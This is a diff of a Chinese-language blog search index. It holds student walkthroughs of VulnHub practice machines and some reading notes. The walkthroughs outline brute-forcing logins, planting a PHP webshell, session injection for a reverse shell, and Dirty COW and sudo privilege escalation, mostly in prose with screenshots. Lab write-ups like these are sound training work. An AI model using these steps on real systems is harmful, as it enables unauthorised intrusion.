-<p>学校资料<br><a href="https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://ab-alex.github.io/2019/06/11/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a> session路径参考<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 提权方式参考</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bob_writeup</title>
-    <url>/2023/12/11/old/bob_writeup/</url>
-    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>名称: Bob: 1.0.1<br>作者：<a href="https://www.vulnhub.com/author/c0rruptedb1t,578/">c0rruptedb1t</a><br>靶机链接1:<a href="https://www.vulnhub.com/entry/bob-101,226/">https://www.vulnhub.com/entry/bob-101,226/</a><br>靶机链接2:<a href="http://c0rruptedb1t.com/vms/bob.html">http://c0rruptedb1t.com/vms/bob.html</a><br>Your Goal is to get the flag in &#x2F;</p>
-</blockquote>
-<p>Hints: Remember to look for hidden info&#x2F;files </p>
-<span id="more"></span>
-
-<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
-<li>robots.txt泄露靶机的自带命令执行webshell</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>找到bob家目录下的敏感文件 和 其Document目录下的一堆敏感文件</li>
-<li>根据文件信息得到jc用户的登录口令和一个加密文件及其密码(密码放在藏头诗里面)</li>
-<li>根据加密文件得到bob用户的登录口令</li>
-<li>bob用户被委派了所有的sudo权限，固能直接切换为root，也能直接查看flag</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><ul>
-<li>GnuPG 最流行的数据加密,数字签名工具软件</li>
-<li>GPG加密的具体步骤</li>
-</ul>
-<ol>
-<li>创建密钥(公钥,私钥)</li>
-<li>公钥用来加密数据,共享给其他人,通过导出公钥实现</li>
-<li>其他人导入公钥,并加密信息发给私钥拥有者</li>
-<li>私钥解密,查看文档</li>
-</ol>
-<p>其遵循OpenPGP标准，由RFC 4880定义</p>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/11/old/bob_writeup/20.png"><br>命令执行漏洞<br><img src="/2023/12/11/old/bob_writeup/45.png"><br>反弹shell<br><img src="/2023/12/11/old/bob_writeup/55.png"><br>在bob家目录发现old_passwordfile<br><img src="/2023/12/11/old/bob_writeup/66.png"><br><img src="/2023/12/11/old/bob_writeup/1.png"><br>登陆jc用户<br><img src="/2023/12/11/old/bob_writeup/2.png"><br>查看bob Secret目录下的内容<br><img src="/2023/12/11/old/bob_writeup/3.png"><br>查看notes.sh内容<br><img src="/2023/12/11/old/bob_writeup/4.png"><br>藏头诗密码解密密文<br><img src="/2023/12/11/old/bob_writeup/5.png"><br>密文内容<br><img src="/2023/12/11/old/bob_writeup/6.png"><br>登陆bob<br><img src="/2023/12/11/old/bob_writeup/7.png"><br>提权，sudo的可用权限大的很<br><img src="/2023/12/11/old/bob_writeup/8.png"><br><img src="/2023/12/11/old/bob_writeup/9.png"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>靶机唯二的难点在于找文件和看藏头诗，都是凭借经验和脑洞灵感之类的东西</li>
-<li>gpg加密这门技术对我来说比较新鲜</li>
-<li>像什么藏头诗、字谜什么的内容可以尝试玩一玩练一练</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校给的资料<br><a href="https://www.gnupg.org/">https://www.gnupg.org/</a><br><a href="https://www.openpgp.org/">https://www.openpgp.org/</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>tommyboy-writeup</title>
-    <url>/2023/12/03/old/tommyboy-writeup/</url>
-    <content><![CDATA[<h1 id="tommyboy-writeup"><a href="#tommyboy-writeup" class="headerlink" title="tommyboy_writeup"></a>tommyboy_writeup</h1><p>这是学校作业</p>
-<span id="more"></span>
-<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机名：tommyboy 1<br>靶机作者：<a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a><br>靶机链接1：<a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a><br>靶机链接2:<a href="http://7ms.us/tommyboy">http://7ms.us/tommyboy</a><br>目标：5个flag和一个final message</p>
-</blockquote>
-<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><ol>
-<li>通过robots.txt泄露发现flag1</li>
-</ol>
-<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><ol>
-<li>根据首页源码提示，得到提示链接，知道网站主目录</li>
-<li>浏览主目录的posts，发现一篇post的回复包含了flag2存放在什么文件的信息</li>
-</ol>
-<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><ol>
-<li>根据主目录post回复中的提示，了解了一个存放图片的网站目录</li>
-<li>下载图片，用strings查看，发现了一串密文(一般有一定规律性，让人觉得很规整但看不懂的就是密文)</li>
-<li>通过在线md5工具解密该密文，得到一个单词</li>
-<li>用该单词作为网站主目录第二篇post的密码，成功访问该post内容</li>
-<li>根据该post提示，了解了靶机有一诡异的ftp服务，通过nmap不断扫描，直到发现多处来一个开放端口</li>
-<li>通过hydra爆破该服务密码，用户名根据post提示已经知道(记得将用户名添加到字典的第一行)</li>
-<li>爆破成功后登入ftp服务</li>
-<li>得到提示文本，发现一新目录，但是没讲具体位置，最后在8008端口的web服务上访问到该目录</li>
-<li>访问目录的回显提示，只有他和steve jobs可以访问其中的内容，通过脑洞猜测，试出来修改UA为iphone就能访问内容(脑洞什么根本没有的，只有抄的份)</li>
-<li>提示需要猜测网站正确的网页名，通过爆破得到网页名，我用的dirbuster(爆破不了一点，100线程就崩了，所以还是抄的)</li>
-<li>访问到网站网页，得到flag3和一hint，同时还有一个加密文件</li>
-</ol>
-<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><ol>
-<li>根据hint中的提示，生成密码字典，我用的crunch</li>
-<li>用fcrackzip爆破成功得到3对用户名和密码，以及一个没有密码的用户名(错的)(前两对密码p用没有，第三对据hint是server的用户名和密码)</li>
-<li>通过wpscan扫描网站的用户</li>
-<li>对tom用户进行密码爆破，字典是rockyou，用wpscan爆破</li>
-<li>访问网站后台，在draft中得到密码提示，与hint中的第三对用户名密码拼接，通过ssh成功得到靶机shell</li>
-<li>ls发现了flag4</li>
-</ol>
-<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><ol>
-<li>根据提示，在靶机根目录发.5.txt</li>
-<li>由于5.txt需要www-data权限，需要通过webshell来获得该权限，所以在&#x2F;var目录下查找网站根目录(由于有两个http端口，所以有两个根目录)</li>
-<li>发现可以在&#x2F;var&#x2F;thatsg0nnaleaveamark&#x2F;NickIzL33t&#x2F;P4TCH_4D4MS&#x2F;uploads写入webshell</li>
-<li>写入一句话木马，通过浏览器直接访问，用该webshell查看.5.txt内容</li>
-<li>拼接5个flag，解压loot.zip，通关该靶场</li>
-</ol>
-<h2 id="getroot"><a href="#getroot" class="headerlink" title="getroot"></a>getroot</h2><ol>
-<li>上传linpeas脚本探测，得知多种提权方式</li>
-<li>使用脏牛脚本提权</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p>robots.txt文件泄露<br>strings解插入隐写<br>hackbar修改User-agent<br>dirbuster网页名爆破<br>crunch密码生成器<br>fcrackzip zip密码爆破工具<br>wpscan(wordpress cms框架扫描器)扫描后台用户名和密码爆破<br>通过webshell获取www-data权限<br>linpeas linux提权漏洞扫描脚本<br>脏牛提权</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/03/old/tommyboy-writeup/11%E7%BD%91%E7%BB%9C%E6%83%85%E5%86%B5.png"><br>robots.txt文件泄露发现的flag1<br><img src="/2023/12/03/old/tommyboy-writeup/12flag1.png"><br>首页源码提示<br><img src="/2023/12/03/old/tommyboy-writeup/13%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA1.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/14%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA2.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/15%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E7%BF%BB%E8%AF%91.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/16%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E6%8C%87%E5%90%91%E9%93%BE%E6%8E%A5.png"><br>最终找到了网站主目录<br><img src="/2023/12/03/old/tommyboy-writeup/17%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%811.png"><br>发现新的网站目录<br><img src="/2023/12/03/old/tommyboy-writeup/18%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%812.png"><br>发现flag2<br><img src="/2023/12/03/old/tommyboy-writeup/19flag2.png"><br>发现图片，发现插入隐写<br><img src="/2023/12/03/old/tommyboy-writeup/21.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/22.png"><br>得到密码，解锁并查看第二篇post<br><img src="/2023/12/03/old/tommyboy-writeup/23.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/24%E5%85%A8%E6%96%87.png"><br>发现神必ftp端口<br><img src="/2023/12/03/old/tommyboy-writeup/25ftp%E7%AB%AF%E5%8F%A3.png"></p>
-<p>爆破ftp账号</p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/27%E5%B0%86%E7%94%A8%E6%88%B7%E5%90%8D%E6%94%BE%E5%9C%A8%E5%AD%97%E5%85%B8%E5%89%8D%E9%9D%A2.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/28%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"><br>发现ftp服务存放的提示文本<br><img src="/2023/12/03/old/tommyboy-writeup/26%E4%B8%8B%E8%BD%BDreadme.png"><br><img src="/2023/12/03/old/tommyboy-writeup/29%E5%BE%97%E5%88%B0%E6%96%B0%E7%9B%AE%E5%BD%95.png"><br>发现8008网站的目录，根据提示修改UA，并爆破网页名<br><img src="/2023/12/03/old/tommyboy-writeup/31%E8%AE%BF%E9%97%AE%E5%88%B0%E7%9B%AE%E5%BD%95.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/32%E6%9B%B4%E6%94%B9useragent%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/33%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B41.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/34%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B42.png"><br>得到flag3和hint<br><img src="/2023/12/03/old/tommyboy-writeup/35flag3+hint.png"><br>爆破backups密码<br><img src="/2023/12/03/old/tommyboy-writeup/36%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/37tommyboy%E4%B8%8A%E7%BA%BF%E6%97%B6%E9%97%B4.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/38%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/39%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/41%E8%A7%A3%E5%8E%8B.png"><br>得到提示<br><img src="/2023/12/03/old/tommyboy-writeup/42%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>wpscan扫描爆破网站后台<br><img src="/2023/12/03/old/tommyboy-writeup/43%E9%80%9A%E8%BF%87wpscan%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/44%E7%88%86%E7%A0%B4%E5%87%BA%E5%AF%86%E7%A0%81.png"><br>登陆后台查看draft<br><img src="/2023/12/03/old/tommyboy-writeup/45%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/46%E8%8E%B7%E5%BE%97%E5%AF%86%E7%A0%81%E6%8F%90%E7%A4%BA.png"><br>根据hint和draft提示，ssh连接靶机<br><img src="/2023/12/03/old/tommyboy-writeup/47ssh%E7%99%BB%E9%99%86.png"><br>查看flag4<br><img src="/2023/12/03/old/tommyboy-writeup/48flag4+%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>找到flag5<br><img src="/2023/12/03/old/tommyboy-writeup/49%E5%8F%91%E7%8E%B0flag5.png"><br>写webshell，获得www-data权限<br><img src="/2023/12/03/old/tommyboy-writeup/50%E5%88%B6%E4%BD%9Cwebshell.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/51%E9%80%9A%E8%BF%87webshell%E8%AF%BB%E5%8F%96flag5.png"><br>提权<br><img src="/2023/12/03/old/tommyboy-writeup/52%E9%80%9A%E8%BF%87linspea%E8%84%9A%E6%9C%AC%E6%8E%A2%E6%B5%8B%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/53%E8%8E%B7%E5%8F%9640616.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/54%E6%8F%90%E6%9D%83.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/55theend.png"><br>flag2和3<br><img src="/2023/12/03/old/tommyboy-writeup/flag2.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/flag3.png"></p>
-<p><img src="/2023/12/03/old/tommyboy-writeup/%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC%E6%B1%87%E6%80%BB.txt"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>dirbuster以前没用过，不过图形化什么的确实挺方便</li>
-<li>linpeas这个脚本，功能十分强大</li>
-<li>脑洞不够，鬼知道stevejobs要改iphone，不过我想，可以讲所有苹果产品的UA搜集起来做成字典，用burpsuite爆破</li>
-<li>这个靶机，getroot是非必要的</li>
-<li>脏牛提权后不久，靶机就会死机，不知道其他提权方法会不会这样</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校给的ppt<br><a href="https://www.cnblogs.com/cute/p/16331359.html">https://www.cnblogs.com/cute/p/16331359.html</a> linpeas脚本介绍<br><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a> linpeas github库<br><a href="https://www.exploit-db.com/exploits/40616">https://www.exploit-db.com/exploits/40616</a> 脏牛提权exp脚本</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>wallabysnightmare102-writeup</title>
-    <url>/2023/11/24/old/wallabysnightmare102-writeup/</url>
-    <content><![CDATA[<h1 id="wallabysnightmare102-writeup"><a href="#wallabysnightmare102-writeup" class="headerlink" title="wallabysnightmare102_writeup"></a>wallabysnightmare102_writeup</h1><p>这是学校作业</p>
-<span id="more"></span>
-<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机名：wallabysnightmare102<br>靶机链接：<a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a><br>作者博客：<a href="https://www.arashparsa.com/">https://www.arashparsa.com/</a></p>
-</blockquote>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol>
-<li>80端口web服务</li>
-<li>使用nikto扫描漏洞后会关闭80端口，并吧网站转移到60080端口</li>
-</ol>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
-<li>发现page参数具有目录穿越漏洞</li>
-<li>nikto扫描该参数</li>
-<li>80端口关闭，继续扫描60080端口的page参数</li>
-<li>发现了&#x2F;?page&#x3D;mailer网页注释</li>
-<li>发现&#x2F;?page&#x3D;mailer&amp;mail&#x3D;ls命令执行漏洞</li>
-<li>通过metasploit获取php reverse shell</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>根据内核版本，上传脏牛提权漏洞 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></li>
-<li>getroot</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p>[[nikto]] web 漏洞扫描工具<br>metasploit 获取反弹shell用<br><code>python3 -m http.server 8081</code> 开启简易web网站，用于上传提权脚本</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><ol>
-<li>端口扫描<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/1.png"></li>
-<li>浏览网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/2.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/3.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/4.png"></li>
-<li>发现目录穿越漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/5.png"></li>
-<li>通过nikto进行漏洞扫描，但是扫到一半超时了<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/6.png"></li>
-<li>发现开启了新端口<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/7.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/8.png"></li>
-<li>访问网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/9.png"></li>
-<li>发现网站仍然有page参数<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/10.png"></li>
-<li>遍历page参数值<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/11.png"></li>
-<li>发现mailer有命令执行漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/12.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/13.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/14.png"></li>
-<li>远程连接<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/15.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/16.png"></li>
-<li>上传提权脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/17.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/18.png"></li>
-<li>编译脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/19.png"></li>
-<li>getshell<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/20.png"></li>
-</ol>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>要善于使用工具，发挥工具的最大功用；当然，弄清楚原理、学的深入是最重要的</li>
-<li>metasploit是一个功能强大的软件，这意味着要学习如何使用也是很花时间的，这也是确实是未来需要花的</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校给的资料<br>提权脚本 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>读书笔记《血酬定律——中国历史中的生存游戏》</title>
-    <url>/2023/11/23/old/readingnote002/</url>
-    <content><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p>
-<span id="more"></span>
-
-<h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol>
-<li>血酬<ol>
-<li>对暴力的酬劳</li>
-<li>价值取决于争拼对象</li>
-<li>为了什么，可以冒多大的风险</li>
-<li>最大化追求假设</li>
-</ol>
-</li>
-<li>血酬推想<ol>
-<li>为了追求血酬的长期最大化，土匪愿意建立保护掠夺对象的秩序。</li>
-<li>法酬——法酬&#x3D;全部税费-公共产品价值</li>
-<li>为了追求短期血酬收入的最大化，合法的暴力集团也可以退化为土匪</li>
-<li>随着血酬逐步降低，生产行为的报酬相对提高，土匪可以转化为农民</li>
-<li>假定血酬不变，随着生产收益的减少以至消失，大量生产者将转入暴力集团</li>
-<li>当某种秩序带来的收益超过旧秩序时，立法者和执法者也应该愿意变法，提高或降低对掠夺对象的保护程度</li>
-</ol>
-</li>
-<li>命价<ol>
-<li>官价</li>
-<li>血价</li>
-</ol>
-</li>
-<li>官话和非官话的转换</li>
-<li>抽水机<ol>
-<li>等水</li>
-<li>抽水</li>
-<li>水来自于暴力差距</li>
-</ol>
-</li>
-<li>灰帮<ol>
-<li>口大口小，形势比人强</li>
-</ol>
-</li>
-<li>灰牢</li>
-<li>英雄到替罪羊的转变</li>
-<li>硬伙企业<ol>
-<li>合作人都是请来的老虎</li>
-</ol>
-</li>
-<li>地头蛇——半封建半帝国</li>
-<li>白员<ol>
-<li>对潜规则的揭发为威胁夺食</li>
-<li>高级的潜规则——自我反对</li>
-</ol>
-</li>
-</ol>
-<h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><ol>
-<li>天下已定，英雄当烹</li>
-</ol>
-<h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>跟潜规则一书差不多，只是挖掘的更具象</p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>读书笔记《潜规则——中国历史中的真实游戏》</title>
-    <url>/2023/11/23/old/readingnote001/</url>
-    <content><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p>
-<span id="more"></span>
-
-<h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol>
-<li>合法伤害权——因而杀心自起，以此讹人夺利</li>
-<li>民不和官斗<ol>
-<li>民斗官，对于民成本竟大于收益，对于官却牵扯到万万人的孝敬。斗争意志比不上</li>
-<li>官手段多，民的手段少(钱、知识、关系网、组织)</li>
-<li>民是散沙，需要出头鸟，但出头就要被打，因为太出头就被皇上听见了</li>
-</ol>
-</li>
-<li>公平等级<ol>
-<li>第一级——真实公平</li>
-<li>第二级——民的心里预期</li>
-<li>第三级——不公平</li>
-</ol>
-</li>
-<li>清官淘汰<ol>
-<li>恶政不需要清官</li>
-<li>不做清官的成本低，收益高</li>
-<li>互相勾结效率更高，清官被恶棍排挤</li>
-</ol>
-</li>
-<li>皇帝龙虾<ol>
-<li>信息茧房</li>
-</ol>
-</li>
-<li>潜规则<ol>
-<li>基于主体造福&#x2F;伤害能力形成的，与光明规则偏离冲突的规则，这是私下里的魔鬼契约</li>
-<li>违规者遭受报复</li>
-<li>主要内容是利益再分配，但在基础部分是收割</li>
-<li>新官堕落定律——<ol>
-<li>晏氏转型——离皇帝越远，贪的成本越低，不贪的风险越高，皇帝越容易被蛊惑</li>
-</ol>
-</li>
-<li>正义边界漂移</li>
-<li>帝国死弯<ol>
-<li>征税越多、聚集起来的暴力越多，但产生的叛乱越多，聚集起来的暴力抵不过叛乱自发生产的暴力，帝国就死了</li>
-<li>谷底有硬石，是叛乱的领袖力量</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><blockquote>
-<p>身怀利器，杀心自起<br>百姓如果变成刺猬，我们不久变成清官了吗<br>恶政是一面筛子，淘汰清官，选择恶棍<br>第一次教育教了官员们满口仁义道德，第二次教育教了他们一肚子男娼女盗</p>
-</blockquote>
-<h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>潜规则和合法伤害权<br>关系</p>
-<ul>
-<li>皇帝与官</li>
-<li>官与民</li>
-<li>皇帝与民</li>
-</ul>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
       </categories>
       <tags>
         <tag>笔记</tag>
@@ -1016,27 +272,151 @@
       </tags>
   </entry>
   <entry>
-    <title>看图识地点</title>
-    <url>/2023/11/05/old/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%9C%B0%E7%82%B9/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这是一个极度简单普通的技术，但其揭示并隐含着通向一条知识的大道<br>这篇文章本身也是极度简陋的，会时不时更新</p>
-<h1 id="训练处"><a href="#训练处" class="headerlink" title="训练处"></a>训练处</h1><p>(暂时不知道有什么比赛)</p>
-<ol>
-<li><a href="https://ctf.show/">https://ctf.show</a> 其中的网络迷踪里的题目很多很有趣，尽管csdn近乎毁了其中的乐趣，不过技术还是值得学习的</li>
-<li><a href="https://www.geoguessr.com/">https://www.geoguessr.com</a> 根据某地的360度图猜地点的游戏</li>
+    <title>Ted:1 writeup</title>
+    <url>/2023/12/17/old/Ted-1-writeup/</url>
+    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
+<p>靶机链接： <a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p>
+</blockquote>
+<span id="more"></span>
+<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><ol>
+<li>http进去时登录验证界面</li>
+<li>用户名密码都好猜的要死，但是密码正确后要提示转成hash，使出来时sha256:英文字母大写</li>
+<li>进去后是一个文件包含的页面</li>
+<li>通过session注入的方式注入一句话反弹shell，然后再包含，得到shell</li>
+<li>session注入方式，是注入user_pref键，注入内容需全部转成urlencode形式</li>
 </ol>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>百度识图<br>搜狗识图<br>google识图 lens.google.com<br>yandox识图 yandox.com&#x2F;images</p>
-<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>得到一张图片，通常要获得该图片所在地址，难一点就是拍摄时间</p>
-<ol>
-<li>识图工具找到图片来源或者以图搜图的找线索</li>
-<li>找的到或找不到，这都是有可能的</li>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
+<li>sudo -l 发现能以root权限无密码执行apt-get命令，以此提权</li>
 </ol>
+<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
+<p><a href="https://tool.oschina.net/encrypt?type=2">https://tool.oschina.net/encrypt?type=2</a> hash加密<br><a href="https://www.iamwawa.cn/daxiaoxie.html">https://www.iamwawa.cn/daxiaoxie.html</a> 英文大小写转换</p>
+</blockquote>
